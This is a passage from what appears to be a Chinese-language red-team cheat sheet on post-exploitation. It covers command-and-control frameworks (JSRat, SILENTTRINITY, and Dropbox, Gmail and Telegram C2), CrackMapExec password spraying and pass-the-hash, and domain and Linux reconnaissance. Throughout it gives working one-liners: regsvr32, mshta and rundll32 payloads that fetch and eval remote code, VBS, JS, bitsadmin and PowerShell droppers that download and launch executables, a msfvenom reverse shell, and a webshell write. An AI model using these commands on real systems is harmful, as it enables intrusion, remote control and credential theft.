title="派生MSF"></a>派生MSF</h5><pre><code>使用CS的外部监听器windows/foreign/reverse_dns_txtwindows/foreign/reverse_httpwindows/foreign/reverse_httpswindows/foreign/reverse_tcpmsf开启监听cobalt strike会话主机上点击spwan，创建外部监听器，选择windows/foreign/reverse_tcp指定MSF监听的IP和端口即可</code></pre><h3 id="JSRat-1"><a href="#JSRat-1" class="headerlink" title="JSRat"></a>JSRat</h3><pre><code>https://github.com/Hood3dRob1n/JSRat-Pyhttps://github.com/Ridter/MyJSRat启动&gt;python JSRat.py -i 192.168.0.107 -p 1234MyJSRat可以-c参数指定执行的命令</code></pre><p><img src="./img/247.png" alt="image"></p><pre><code>/connect是回连地址，/wtf是执行代码</code></pre><p><img src="./img/248.png" alt="image"></p><pre><code>直接在靶机执行</code></pre><p><img src="./img/249.png" alt="image"></p><pre><code>或&gt;regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dllJSRat显示上线</code></pre><p><img src="./img/250.png" alt="image"><br><img src="./img/251.png" alt="image"></p><pre><code>Wsc方式</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>component</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>testCalc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try&#123;v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\"GET\",\"http://192.168.0.107:1234/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;";        new ActiveXObject("WScript.Shell").Run(rat,0,true);]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>component</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:http://192.168.0.107/jsrat.wsc&quot;)Mshta方式&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:1234/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;</code></pre><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>返回活动主机&gt;crackmapexec smb 192.168.0.0/24</code></pre><p><img src="./img/252.png" alt="image"></p><h4 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破"></a>爆破</h4><pre><code>支持协议ssh,smb,winrm,mssql,http爆破smb协议，两台机器，一个用户名多个密码&gt;crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2&gt;crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p &#39;password&#39; --shares</code></pre><p><img src="./img/253.png" alt="image"></p><pre><code>密码喷射&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1指定字典&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -p /tmp/pass.txtHash爆破&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -H /tmp/ntlm.txt</code></pre><h4 id="可用模块"><a href="#可用模块" class="headerlink" title="可用模块"></a>可用模块</h4><pre><code>日志的保存位置~/.cme/logs查看协议可用后续模块&gt;crackmapexec smb -L</code></pre><p><img src="./img/254.png" alt="image"></p><pre><code>常用的模块Get-ComputerDetails获取计算机信息Bloodhound 执行一个BloodHound脚本获取信息empire_exec 与empire交互enum_avproducts 列举AV产品enum_chrome 获取目标chrome中保存的密码get_keystrokes 键盘记录get_netdomaincontroller 列出所有域控制器get_netrdpsession 列出活动的RDP会话gpp_autologin 从域控中registry.xml查找自动登录的账户密码gpp_password 组策略凭据中返回GPP密码invoke_sessiongopher 保存putty,winscp,filezilla,superputty rdp的sessioninvoke_vnc 注入一个vnc客户端到内存met_inject 与msf交互mimikatz 调用mimikatz模块mimikatz_enum_chrome 使用mimikatz解密chrome保存的密码mimikatz_enum_vault_creds 解密windows凭据管理器中保存的密码mimikittenz 执行咪咪猫(windows密码获取软件)multirdp 允许多用户登录RDPnetripper 通过API hooking截取平常pe_inject DLL/EXE注入rdp 开启或关闭RDPshellcode_inject 注入shellcodetokens 列举可用tokenuac 查看UAC是否开启wdigest 开启或关闭wdigestweb_delivery 执行exploit/multi/script/web_delivery模块查看模块的选项&gt;crackmapexec smb -M module --options</code></pre><p><img src="./img/255.png" alt="image"></p><pre><code>使用方式&gt;crackmapexec smb &lt;target(s)&gt; -u user -p &#39;P@ssw0rd&#39; -M module -o 参数=值</code></pre><p><img src="./img/256.png" alt="image"></p><h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><pre><code>&gt;crackmapexec smb &lt;target(s)&gt; -u username -H LMHASH:NTHASH&gt;crackmapexec smb &lt;target(s)&gt; -u username -H NTHASH</code></pre><h4 id="执行命令-1"><a href="#执行命令-1" class="headerlink" title="执行命令"></a>执行命令</h4><pre><code>&gt;crackmapexec smb 192.168.0.98 -u y -p &#39;qwe12323&#39; -x &#39;command&#39;</code></pre><p><img src="./img/257.png" alt="image"></p><pre><code>-X执行powershell命令&gt;crackmapexec smb 192.168.0.98 -u y -p &#39;qwe12323&#39; -X &#39;POWESHELL&#39;</code></pre><h3 id="koadic"><a href="#koadic" class="headerlink" title="koadic"></a>koadic</h3><pre><code>https://github.com/zerosum0x0/koadic&gt;git clone https://github.com/zerosum0x0/koadic.git&gt;cd koadic&gt;pip3 install -r requirements.txt&gt;./koadic</code></pre><h3 id="SILENTTRINITY"><a href="#SILENTTRINITY" class="headerlink" title="SILENTTRINITY"></a>SILENTTRINITY</h3><pre><code>https://github.com/byt3bl33d3r/SILENTTRINITY类似cobalt strike+empire的结合&gt;git clone https://github.com/byt3bl33d3r/SILENTTRINITY&gt;pip3 install --user pipenv &amp;&amp; pipenv install &amp;&amp; pipenv shell&gt;python st.py服务端执行&gt;python3 st.py teamserver &lt;teamserver_ip&gt; &lt;teamserver_password&gt;&gt;python3 st.py teamserver 192.168.0.108 123456也可加参数--port指定端口</code></pre><p><img src="./img/258.png" alt="image"></p><pre><code>客户端执行&gt;python3 st.py client wss://&lt;username&gt;:&lt;teamserver_password&gt;@&lt;teamserver_ip&gt;:5000&gt;python3 st.py client wss://y:123456@192.168.0.108:5000</code></pre><p><img src="./img/259.png" alt="image"></p><pre><code>&gt;listeners命令进入监听器目录&gt;use http选择监听器&gt;options命令查看需要配置的参数</code></pre><p><img src="./img/260.png" alt="image"></p><pre><code>&gt;set Port 8081 使用set命令配置参数&gt;start 启动监听器&gt;list查看运行中的监听器</code></pre><p><img src="./img/261.png" alt="image"></p><pre><code>&gt;stop http使用stop+监听器名字停止监听器&gt;stagers进入payload目录&gt;list列出可用payload</code></pre><p><img src="./img/262.png" alt="image"></p><pre><code>&gt;use payloadname 命令use+payload名字&gt;generate http generate+监听器名字生成payload</code></pre><p><img src="./img/263.png" alt="image"></p><h3 id="Browser-C2"><a href="#Browser-C2" class="headerlink" title="Browser C2"></a>Browser C2</h3><pre><code>360全套+火绒没有拦截缺点:会有黑框，并且打开chrome浏览器，功能限制https://github.com/0x09AL/Browser-C2&gt;go get -u github.com/gorilla/mux&gt;go get -u github.com/chzyer/readline&gt;git clone https://github.com/0x09AL/Browser-C2.git/Browser-C2/agent/agent.go修改C2地址</code></pre><p><img src="./img/264.png" alt="image"></p><pre><code>修改chrome的位置</code></pre><p><img src="./img/265.png" alt="image"></p><pre><code>编译客户端&gt;CGO_ENABLED=1 GOARCH= GOOS=windows go build</code></pre><p><img src="./img/266.png" alt="image"></p><pre><code> /Browser-C2/static/jquery.js修改控制服务器IP</code></pre><p><img src="./img/267.png" alt="image"></p><pre><code>转到主目录编译服务器端&gt;go build靶机执行生成好的客户端攻击机监听</code></pre><p><img src="./img/268.png" alt="image"></p><pre><code>此框架与靶机之间通信未加密，功能有限，可与msf、cs、poshc2、empire等框架建立联系。</code></pre><h3 id="DropBox-C2"><a href="#DropBox-C2" class="headerlink" title="DropBox C2"></a>DropBox C2</h3><pre><code>&gt;git clone https://github.com/Arno0x/DBC2 dbc2&gt;cd dbc2&gt;pip install -r requirements.txt&gt;chmod +x dropboxC2.pyhttps://www.dropbox.com/developers/apps/create创建好后要生成个accesstoken，填入config.py中</code></pre><p><img src="./img/269.png" alt="image"></p><pre><code>执行</code></pre><p><img src="./img/270.png" alt="image"></p><pre><code>这里需设置一个与受控机交互的加密密码发布agent&gt;publishStage dbc2_agent.exe使用命令listPublishedStage可以看到已发布的agent</code></pre><p><img src="./img/271.png" alt="image"></p><pre><code>生成payload&gt;genStager [tab]查看可生成的格式</code></pre><p><img src="./img/272.png" alt="image"></p><pre><code>&gt;genStager oneliner default生成powershell格式payload</code></pre><p><img src="./img/273.png" alt="image"></p><pre><code>&gt;genStager batch default生成bat格式</code></pre><p><img src="./img/274.png" alt="image"></p><pre><code>Msbuild，其余不做演示</code></pre><p><img src="./img/275.png" alt="image"></p><pre><code>这里使用powershell格式的，在受控机运行</code></pre><p><img src="./img/276.png" alt="image"></p><pre><code>攻击机可以看到上线</code></pre><p><img src="./img/277.png" alt="image"></p><pre><code>&gt;list命令可以看到已控机器</code></pre><p><img src="./img/278.png" alt="image"></p><pre><code>使用use命令与受控机器交互</code></pre><p><img src="./img/279.png" alt="image"></p><pre><code>输入?获得后续命令</code></pre><p><img src="./img/280.png" alt="image"></p><h3 id="Gmail-C2"><a href="#Gmail-C2" class="headerlink" title="Gmail C2"></a>Gmail C2</h3><h4 id="Gcat"><a href="#Gcat" class="headerlink" title="Gcat"></a>Gcat</h4><pre><code>https://myaccount.google.com/lesssecureapps启用设置</code></pre><p><img src="./img/281.png" alt="image"></p><pre><code>Gmail启用imap</code></pre><p><img src="./img/282.png" alt="image"></p><pre><code>将以下脚本转换为exe# setup.pyfrom distutils.core import setupimport py2exe setup(console=[&#39;implant.py&#39;])https://github.com/byt3bl33d3r/gcat把gcat项目中的implant.py跟以上脚本放在同一目录，修改implant.py中的账户信息</code></pre><p><img src="./img/283.png" alt="image"></p><pre><code>&gt;python 1.py py2exe打包dist目录下生成implant.exe受控机执行同时也要修改项目中gcat.py中的账户信息</code></pre><p><img src="./img/284.png" alt="image"></p><pre><code>在受控机执行implant.exe，如果报错修改email模块以下三行from email.mime.multipart import MIMEMultipartfrom email.mime.base import MIMEBasefrom email.mime.text import MIMEText</code></pre><p><img src="./img/285.png" alt="image"></p><pre><code>执行后，邮箱会收到信息</code></pre><p><img src="./img/286.png" alt="image"></p><pre><code>使用gcat.py也可以得到当前会话&gt;python gcat.py -list</code></pre><p><img src="./img/287.png" alt="image"></p><pre><code>现在可对其进行控制&gt;python gcat.py -id [id] -cmd &#39;net user&#39;</code></pre><p><img src="./img/288.png" alt="image"></p><pre><code>生成jobid，指定jobid可查看回显</code></pre><p><img src="./img/289.png" alt="image"></p><pre><code>邮箱中也存在</code></pre><p><img src="./img/290.png" alt="image"></p><pre><code>当受控机为中文系统时，回显会报错，修改代码</code></pre><p><img src="./img/291.png" alt="image"></p><pre><code>其他模块有回显的直接修改后重新py2exe打包即可。支持的功能:cmd,upload/download,执行shellcode,键盘记录,截屏等</code></pre><h4 id="Gdog"><a href="#Gdog" class="headerlink" title="Gdog"></a>Gdog</h4><pre><code>https://github.com/maldevel/gdog功能更多:加密传输、地理位置、执行命令、上传下载、shellcode、截图、键盘记录、关闭重启、注销用户、从web下载、访问网站等配置流程基本一样，需要打包exe，但是要安装一些模块PyCrypto、WMI、Enum34、Netifaces# setup.pyfrom distutils.core import setupimport py2exe setup(console=[&#39;client.py&#39;])client.py在回显处也要添加decode gbk执行client.exe报超出索引错误时在client.py中搜索字符串for iface in netifaces.interfaces():在它下面一行修改为if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0][&#39;addr&#39;] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):打包好后执行</code></pre><p><img src="./img/292.png" alt="image"><br><img src="./img/293.png" alt="image"><br><img src="./img/294.png" alt="image"><br><img src="./img/295.png" alt="image"></p><pre><code>提取jobid回显出错的话，添加reload(sys)sys.setdefaultencoding(&quot;utf-8&quot;)执行shellcode&gt;msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python去除引号加减号，只保留shellcode粘贴到文件shell.txt&gt;python gdog.py -id &#123;id&#125; -exec-shellcode /tmp/shell.txt</code></pre><h3 id="Telegram-C2"><a href="#Telegram-C2" class="headerlink" title="Telegram C2"></a>Telegram C2</h3><pre><code>登录telegram访问https://telegram.me/botfather，发送消息</code></pre><p><img src="./img/296.png" alt="image"></p><pre><code>创建一个bot</code></pre><p><img src="./img/297.png" alt="image"></p><pre><code>创建完成后返回一个token&gt;pip install telepot&gt;pip install requests&gt;git clone https://github.com/blazeinfosec/bt2.git编辑bt2.py粘贴token和chatid进脚本Chat_id的获取方式https://api.telegram.org/bot&lt;token&gt;/getUpdates</code></pre><p><img src="./img/298.png" alt="image"><br><img src="./img/299.png" alt="image"></p><pre><code>当有受控机上线时会列出功能</code></pre><p><img src="./img/300.png" alt="image"><br><img src="./img/301.png" alt="image"></p><pre><code>Windowshttps://github.com/sf197/Telegra_Csharp_C2</code></pre><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Cmd"><a href="#Cmd" class="headerlink" title="Cmd"></a>Cmd</h3><pre><code>&gt;whoami /user 查看当前用户SID&gt;net config Workstation 查看当前计算机信息&gt;net time /domain 判断主域错误5：存在域，当前不是域用户显示时间：存在域，当前是域内用户找不到域：不存在&gt;net view /domain 列出域列表&gt;net group &quot;Domain Controllers&quot; /domain查看主域控&gt;nltest /DCLIST:zone.com 查看域控&gt;net group &quot;domain admins&quot; /domain 查看域管理员&gt;net group &quot;enterprise admins&quot; /domain 查看企业管理员列表&gt;net localgroup administrators /domain 查看管理组用户&gt;net group &quot;domain computers&quot; /domain 查看域成员计算机&gt;net accounts /domain 查看密码策略&gt;net user /domain查看域内用户&gt;net view /domain:dc 查询域内计算机&gt;netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)&gt;netsh advfirewall set allprofiles state off/on(大于win2003)&gt;arp -a查看arp表&gt;net start 查看服务&gt;route print查看路由表&gt;query user查看登录机器的用户的连接状态&gt;tasklist /v 查看域管理员进程&gt;dsquery server查询域控制器&gt;dsquery computer 查询域内机器&gt;dsquery user 查询域用户&gt;dsquery ou 域内组织单位导出域DNS记录，文件保存在C:\Windows\System32\dns\&gt;dnscmd /zoneexport zone.com 1.txt导出LDAP数据库&gt;LDIFDE -f c:\windows\temp\dump.ldf -n -m</code></pre><h3 id="Wmi"><a href="#Wmi" class="headerlink" title="Wmi"></a>Wmi</h3><pre><code>&gt;wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本&gt;wmic service list brief 列出本机服务&gt;wmic process list brief 列出进程&gt;wmic process where name=&quot;chrome.exe&quot; get executablepath进程路径&gt;wmic process get caption,commandline /value&gt;&gt;1.txt查询所有进程参数&gt;wmic process where caption=&quot;svchost.exe&quot; get caption,commandline /value 查询某个进程命令行参数创建进程&gt;wmic process call create calc&gt;wmic process call create &quot;C:\shell.exe&quot;&gt;wmic process call create &quot;shutdown.exe -r -f -t 20&quot;结束进程&gt;wmic process where name=&quot;shell.exe&quot; call terminate&gt;wmic process where processid=&quot;2345&quot; delete&gt;wmic process 2345 call terminate&gt;wmic startup list brief 列出自启动程序&gt;wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件&gt;wmic netuse list brief 列出共享驱动盘&gt;wmic ntdomain list brief 查询域控制器&gt;wmic useraccount list brief 列出本机管理员及SID&gt;wmic qfe list brief 列出补丁列表&gt;wmic share get name,path 查看共享&gt;wmic startup list brief查看启动项&gt;wmic product get name,version 查看安装的软件&gt;wmic product where &quot;name like &#39;%360%&#39;&quot; get name 查看程序名&gt;wmic product where name=&quot;360tray&quot; call uninstall 卸载程序&gt;wmic process where &quot;name like &#39;%360%&#39;&quot; get name 查找进程全名&gt;wmic product where name=&quot;360tray.exe&quot; call terminate 停止程序&gt;wmic desktop get screensaversecure,screensavertimeout 查看屏保</code></pre><h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><pre><code>获取域信息&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Get-NetDomain&#125;&quot;</code></pre><p><img src="./img/302.png" alt="image"></p><pre><code>&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; get-netforest&#125;&quot;</code></pre><p><img src="./img/303.png" alt="image"></p><pre><code>枚举管理员&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Invoke-EnumerateLocalAdmin&#125;&quot;</code></pre><p><img src="./img/304.png" alt="image"></p><pre><code>查询管理在线的机器&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-userhunter&#125;&quot;</code></pre><p><img src="./img/305.png" alt="image"></p><pre><code>查看域内机器以administrator权限运行的进程&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-processhunter &#125;&quot;</code></pre><p><img src="./img/306.png" alt="image"></p><pre><code>或指定参数userfile和computerfile查询某台机器某个用户的进程&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; invoke-processhunter -Userfile .\user.txt -computerfile .\host.txt&#125;&quot;</code></pre><p><img src="./img/307.png" alt="image"></p><pre><code>查询域内机器共享&gt;powershell -exec bypass -Command &quot;&amp;&#123;Import-Module .\powerview.ps1; Invoke-sharefinder&#125;&quot;</code></pre><p><img src="./img/308.png" alt="image"></p><pre><code>查询域内机器&gt;Get-NetComputer -Domain zone.com</code></pre><p><img src="./img/309.png" alt="image"></p><pre><code>&gt;Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器</code></pre><p><img src="./img/310.png" alt="image"></p><pre><code>Dev-powerview获取域控机器和win版本&gt;Get-DomainController |select name,osversion|fl </code></pre><h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><pre><code>操作系统&amp;内核版本&amp;环境变量&gt;cat /etc/issue&gt;cat /etc/*-release&gt;cat /etc/lsb-release&gt;cat /etc/redhat-releasecat /proc/version&gt;uname -a&gt;uname -mrs&gt;rpm -q kernel&gt;dmesg | grep Linux&gt;ls /boot | grep vmlinuz-&gt;cat /etc/profile&gt;cat /etc/bashrc&gt;cat ~/.bash_profile&gt;cat ~/.bashrc&gt;cat ~/.bash_logout&gt;env&gt;setRoot权限进程&gt;ps aux | grep root&gt;ps -ef | grep root计划任务&gt;crontab -l&gt;ls -alh /var/spool/cron&gt;ls -al /etc/ | grep cron&gt;ls -al /etc/cron*&gt;cat /etc/cron*&gt;cat /etc/at.allow&gt;cat /etc/at.deny&gt;cat /etc/cron.allow&gt;cat /etc/cron.deny&gt;cat /etc/crontab&gt;cat /etc/anacrontab&gt;cat /var/spool/cron/crontabs/rootIP信息&gt;/sbin/ifconfig -a&gt;cat /etc/network/interfaces&gt;cat /etc/sysconfig/network连接信息&gt;grep 80 /etc/services&gt;netstat -antup&gt;netstat -antpx&gt;netstat -tulpn&gt;chkconfig --list&gt;chkconfig --list | grep 3:on&gt;last&gt;w用户信息&gt;id&gt;whomi&gt;w&gt;last&gt;cat /etc/passwd&gt;cat /etc/group&gt;cat /etc/shadow&gt;ls -alh /var/mail/&gt;grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;   # 列出超级用户&gt;awk -F: &#39;($3 == &quot;0&quot;) &#123;print&#125;&#39; /etc/passwd   #列出超级用户&gt;cat /etc/sudoers&gt;sudo –l操作记录&gt;cat ~/.bash_history&gt;cat ~/.nano_history&gt;cat ~/.atftp_history&gt;cat ~/.mysql_history&gt;cat ~/.php_history可写目录&gt;find / -writable -type d 2&gt;/dev/null      # 可写目录&gt;find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 &gt;find / -perm -o w -type d 2&gt;/dev/null     # 可写目录&gt;find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录&gt;find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</code></pre><h2 id="HTTP服务"><a href="#HTTP服务" class="headerlink" title="HTTP服务"></a>HTTP服务</h2><pre><code>&gt;python2 -m SimpleHTTPServer &gt;python3 -m http.server 8080&gt;php -S 0.0.0.0:8888&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW&gt;ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888,:DocumentRoot =&gt; Dir.pwd).start&quot;&gt;ruby -run -e httpd . -p 8888</code></pre><h2 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="Windows查找文件"><a href="#Windows查找文件" class="headerlink" title="Windows查找文件"></a>Windows查找文件</h3><pre><code>&gt;cd /d E: &amp;&amp; dir /b /s index.php&gt;for /r E:\ %i in (index*.php) do @echo %i&gt;powershell Get-ChildItem d:\ -Include index.php -recurse</code></pre><h3 id="Linux查找文件"><a href="#Linux查找文件" class="headerlink" title="Linux查找文件"></a>Linux查找文件</h3><pre><code>#find / -name index.php查找木马文件&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;&gt;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><pre><code>读文本文件：&gt;file = Get-Content &quot;1.txt&quot;&gt;file&gt;powershell Set-content &quot;1.txt&quot; &quot;wocao&quot;&amp;&gt;powershell &quot;write-output ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\&quot;d2Vic2hlbGw=\&quot;))) | out-file -filepath c:\www\wwwroot\1.aspx;&quot;</code></pre><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><pre><code>&gt;rar.exe a –k –r –s –m3 C:\1.rar C:\wwwroot&gt;7z.exe a –r –p12345 C:\1.7z C:\wwwroot</code></pre><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><pre><code>&gt;rar.exe e c:\wwwroot\1.rar&gt;7z.exe x –p12345 C:\1.7z –oC:\wwwroot</code></pre><h3 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h3><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><pre><code>&gt;open 192.168.0.98 21&gt;输入账号密码&gt;dir查看文件&gt;get file.txt</code></pre><p><img src="./img/311.png" alt="image"></p><h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><pre><code>#1.vbs</code></pre><pre class="line-numbers language-vb" data-language="vb"><code class="language-vb">Set Post &#x3D; CreateObject(&quot;Msxml2.XMLHTTP&quot;)Set Shell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)Post.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.1.192&#x2F;Client.exe&quot;,0Post.Send()Set aGet &#x3D; CreateObject(&quot;ADODB.Stream&quot;)aGet.Mode &#x3D; 3aGet.Type &#x3D; 1aGet.Open()aGet.Write(Post.responseBody)aGet.SaveToFile &quot;C:\1.exe&quot;,2 &gt;cscript 1.vbsConst adTypeBinary &#x3D; 1Const adSaveCreateOverWrite &#x3D; 2Dim http,adoSet http &#x3D; CreateObject(&quot;Msxml2.serverXMLHTTP&quot;)http.SetOption 2,13056&#x2F;&#x2F;忽略HTTPS错误http.open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.1.192&#x2F;Client.exe&quot;,Falsehttp.sendSet ado &#x3D; createobject(&quot;Adodb.Stream&quot;)ado.Type &#x3D; adTypeBinaryado.Openado.Write http.responseBodyado.SaveToFile &quot;c:\1.exe&quot;ado.Close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> WinHttpReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WinHttp.WinHttpRequest.5.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> WScript<span class="token punctuation">.</span><span class="token function">Arguments</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">/*async=*/</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"ADODB.Stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span>Type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> BinStream<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>WinHttpReq<span class="token punctuation">.</span>ResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span><span class="token function">SaveToFile</span><span class="token punctuation">(</span><span class="token string">"1.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>&gt;cscript /nologo 1.js http://192.168.1.192/Client.exe</code></pre><p><img src="./img/312.png" alt="image"></p><h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><pre><code>&gt;bitsadmin /transfer n http://192.168.1.192/Client.exe  e:\1.exe&gt;bitsadmin /rawreturn /transfer getfile http://192.168.1.192/Client.exe e:\1.exe&gt;bitsadmin /rawreturn /transfer getpayload http://192.168.1.192/Client.exe e:\1.exe&gt;bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.1.192/Client.exe&quot; &quot;e:\1.exe &quot;</code></pre><h4 id="Powershell-2"><a href="#Powershell-2" class="headerlink" title="Powershell"></a>Powershell</h4><h5 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h5><pre><code>注意：内核5.2以下版本可能无效&gt;powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/Client.exe&#39;,&#39;C:\1.exe&#39;); start-process &#39;c:\1.exe&#39;&gt;powershell &gt;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.0.108/1.exe&#39;,&quot;$env:APPDATA\csrsv.exe&quot;);Start-Process(&quot;$env:APPDATA\csrsv.exe&quot;)</code></pre><h5 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h5><pre><code>PS&gt;Copy-Item &#39;\\sub2k8.zone.com\c$\windows\1.txt&#39; -Destination &#39;\\dc.zone.com\c$\1.txt&#39;</code></pre><h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><pre><code>&gt;powershell ($dpl=$env:temp+&#39;f.exe&#39;);(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.0.108/ok.txt&#39;,$dpl);</code></pre><h5 id="4"><a href="#4" class="headerlink" 